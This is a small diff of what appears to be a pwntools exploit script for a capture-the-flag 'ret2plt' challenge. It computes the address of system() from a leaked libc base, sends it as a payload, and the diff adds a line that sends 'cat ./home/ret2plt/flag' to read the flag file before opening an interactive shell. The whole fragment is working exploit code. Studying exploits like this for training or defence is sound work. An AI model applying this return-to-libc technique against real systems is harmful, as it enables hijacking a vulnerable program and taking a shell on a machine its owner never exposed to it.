@@ -28,5 +28,6 @@ sys_addr = libc_addr + sys_off
 
 pay = flat([sys_addr])
 r.send(pay)
+r.sendline('cat ./home/ret2plt/flag')
 r.interactive()
 
